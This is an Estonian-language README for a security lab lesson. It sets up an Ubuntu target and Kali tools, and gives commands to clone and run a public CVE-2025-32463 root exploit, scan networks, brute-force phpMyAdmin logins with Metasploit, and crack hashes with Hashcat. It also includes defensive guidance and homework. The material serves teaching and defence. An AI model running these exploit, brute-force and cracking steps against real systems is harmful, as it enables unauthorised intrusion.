# README — Praktiline tund: Võrguskannimine, eksploitatsioon ja kaitse
**Autor:** ocrHeiki  
**Keel:** Eesti  
**Versioon:** v1.0

---

## Sisukord
- [Eesmärk](#eesmärk)  
- [Hoiatus ja eetika](#hoiatus-ja-eetika)  
- [Keskkonna ülesseadistus](#keskkonna-ülesseadistus)  
  - [Masinad](#masinad)  
  - [Võrgustruktuur (näide)](#võrgustruktuur-näide)  
- [Ubuntu Server — samm-sammult](#ubuntu-server---samm-sammult)  
- [Kali — avastamine ja tööriistad](#kali---avastamine-ja-tööriistad)  
  - [Nmap](#nmap)  
  - [WhatWeb & dirsearch](#whatweb--dirsearch)  
  - [Metasploit (auxiliary)](#metasploit-auxiliary)  
  - [Hashcat](#hashcat)  
- [Näidiskäsud (kokkuvõte)](#näidiskäsud-kokkuvõte)  
- [Kaitsemeetmed ja monitooring — lühijuhend](#kaitsemeetmed-ja-monitooring---lühijuhend)  
- [Kodutöö (ülesanded)](#kodutöö-ülesanded)  
- [Soovitatud failistruktuur](#soovitatud-failistruktuur)  
- [Mall: kaitse_meetmed.md (näide)](#mall-kaitse_meetmedmd-näide)  
- [Kontakt / autori märkus](#kontakt--autori-märkus)

---

## Eesmärk
See README annab praktilise ja kompaktse juhendi labikeskkonna ülesseadmise, haavatavuste otsimise ning lihtsate kaitsemeetmete dokumenteerimise jaoks. Mõeldud õppeotstarbeliseks ja testkeskkondades kasutamiseks.

---

## Hoiatus ja eetika
**Oluline:** kõik siin kirjas olevad meetodid tohib kasutada **ainult** oma testkeskkonnas või kirjaliku loaga vastava süsteemi omanikult. Ebaseaduslik või volitamata rünnak on kuritegu. Kui leiad haavatavuse reaalses süsteemis — kasuta vastutustundliku avaldamise protsessi.

---

## Masinad
- **Ubuntu Server** — testsiht, kuhu laeme demo-eksploidid.  
- **Kali Linux** — ründe- ja avastustööriistad (Nmap, WhatWeb, Metasploit, Hashcat).  
- **Ruuter** — 2 võrguadapterit: INTERNET ja sisemine VLAN (testvõrk).  
- **app-masin (template)** — teenuste testimiseks.

---

## Võrgustruktuur (näide)
- Võrk: `192.168.1.0/24`  
- Näidissiht: `192.168.1.69` (asenda oma labivõrgu IP-ga)

---

## Ubuntu Server — samm-sammult

### 1) Põhipaketid
```bash
sudo apt update
sudo apt install -y gcc git
```

### 2) Kasutaja loomine (ilma `sudo` õigusteta)
```bash
sudo adduser kala
# parool (näide): ka1a
```
> Märkus: äriliselt/reaalses keskkonnas ära kasuta lihtsaid paroole.

### 3) Exploit'i alla laadimine
```bash
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
ls
chmod +x exploit.sh
```

### 4) Exploit'i käivitamine (AINULT testkeskkonnas)
```bash
./exploit.sh
# kontroll:
id
```
Kui exploit töötab, võib see anda `root` õigused (näide).

### 5) Root parooli seadistamine ja sudo paigaldus
```bash
passwd root
apt update && apt install -y sudo
```

---

## Kali — avastamine ja tööriistad

> Tööta ainult lubatud testkeskkonnas.

### Nmap — võrgu- ja teenuseskann
```bash
sudo nmap -sV -O 192.168.1.0/24
```
- Märgi üles huvipakkuvad hostid ja avatud pordid (nt `22`, `80`, `443`).

### WhatWeb — veebiplatvormi tuvastus
```bash
whatweb http://192.168.1.69
```

### Dirsearch — veebikataloogide leidmine
```bash
sudo apt install -y dirsearch
dirsearch -u http://192.168.1.69 -e php,html,txt
```

### Metasploit — auxiliary skännerid (õpetlik)
```text
msfconsole
use auxiliary/scanner/http/phpmyadmin_login
options
set RHOSTS 192.168.1.69
set TARGETURI /phpmyadmin/index.php
echo root >> /tmp/user.txt
set user_file /tmp/user.txt
set pass_file /home/heiki/Documents/rockyou.txt
run
exit
```
> Hoiatus: bruteforce ja sarnased rünnakud on invasiivsed ning võivad tekitada alarme.

### Hashcat — paroolihashide purustamine (õpetlik)
1. Salvesta hash faili (nt `hash.txt`).  
2. Käivita:
```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
```
- Asenda `<mode>` vastavalt hash-tüübile (nt MD5, SHA1, bcrypt → erinevad `-m` väärtused).

---

## Näidiskäsud (kokkuvõte)
```bash
# Ubuntu
sudo apt update
sudo apt install -y gcc git
sudo adduser kala
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
chmod +x exploit.sh
./exploit.sh

# Kali
sudo nmap -sV -O 192.168.1.0/24
whatweb http://192.168.1.69
dirsearch -u http://192.168.1.69
msfconsole
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Kaitsemeetmed ja monitooring — lühijuhend

### 1) Eksploit (CVE) maandamine
- Hoia süsteemid ajakohasena: `apt update && apt upgrade`.  
- Kasuta `unattended-upgrades` turvavärskenduste jaoks.  
- Piira võrgupindu (firewall, VLAN-segmendid) ja välista avalik ligipääs tundlikele teenustele.

### 2) Veebirakendused (WordPress / phpMyAdmin)
- Värskenda CMS-e, teemasid ja pluginaid regulaarse auditi alusel.  
- Piira phpMyAdmin ligipääsu (IP-blokeering, VPN või sisevõrk).  
- Rakenda tugevaid paroole ja mitmefaktorilist autentimist (MFA).  
- Kasuta WAF-i (nt mod_security) ja regulaarselt skänni koodi.

### 3) Paroolikaitse
- Kehtesta paroolipoliitika (min pikkus, keerukus, lockout).  
- Salvestamisel kasuta soolatud ja vastupidavaid hashe (bcrypt/argon2).  
- Piira räsimisi: fail2ban, rate-limiting, account lockouts.

### 4) Monitooring & SIEM
- Koguge logisid: `auth.log`, webserver `access/error` logid, firewall, DB logid.  
- SIEM reeglite näited:
  - korduvad ebaõnnestunud SSH loginid → alarm  
  - ootamatu DB andmete eksport → alarm  
  - protsesside eskalatsioon (root shell spawn) → alarm

### 5) Incidendi reageerimine
- Isoleeri haavatud masin võrguühenduseta (segmenteerimine).  
- Säilita tõendid (kettapilt, mälu dump) eraldi turvalises hoidlas.  
- Teosta forensika ja taastamine varukoopiast, seejärel rakenda parandused.

---

## Kodutöö — ülesanded
Koosta dokument (kasuta malli `kaitse_meetmed.md`), mis käsitleb **kuidas kaitsta kolme rünnetüüpi**:

1. **Eksploit (CVE)** — kirjeldus, test, parandused.  
2. **Veebihaavatavus / bruteforce (WordPress / phpMyAdmin)** — riskid ja tõrjevõtted.  
3. **Paroolide murdmine** — kuidas välistada ja tuvastada.

Iga rünne peaks sisaldama:
- Kirjeldust (mis ja kuidas)  
- Testkeskkonna näide (kasutatud käsud)  
- Konkreetsed kaitsemeetmed (konfiguratsiooninäited)  
- Monitooringu ja alarmeerimise näited  
- Parandus- ja taastamisplaan

---

## Soovitatud failistruktuur
```
/praktiline-tund/
├─ README.md
├─ ubuntu/
│  ├─ ubuntu_setup.md
│  └─ exploit_demo/          # ainult referentsiks
├─ kali/
│  ├─ nmap_report.md
│  ├─ metasploit_steps.md
│  └─ hashcat_notes.md
├─ docs/
│  ├─ kaitse_meetmed.md
│  └─ logs_and_alerts.md
└─ homework/
   └─ kodutoo_vastus.md
```

---

## Mall: `kaitse_meetmed.md` (näide)
```markdown
# Kaitsemeetmed: Eksploit (CVE-XXXX-YYYY)

## 1. Kirjeldus
Lühike tehniline kokkuvõte rünnaku olemusest.

## 2. Riskid
Millised teenused/pordid on mõjutatud.

## 3. Kaitse
- apt update && apt upgrade
- konfigureeri unattended-upgrades
- piirata teenuse ligipääsu (firewall, VLAN)
- rakendada least-privilege kontod

## 4. Monitooring
- jälgi auth.log, syslog, webserver logs
- SIEM reegel: "Root shell spawn" -> alarm

## 5. Reaktsioon
- isolatsioon, kettapilt, uurimine, parandamine, taastamine varukoopiast
```

---

## Kontakt / autori märkus
Kui soovid, konvertin selle README.md PDF-iks või loon valmis `kaitse_meetmed.md` ja `logs_and_alerts.md` mallid. Võin ka aidata GitHub repo initsialiseerimisel.
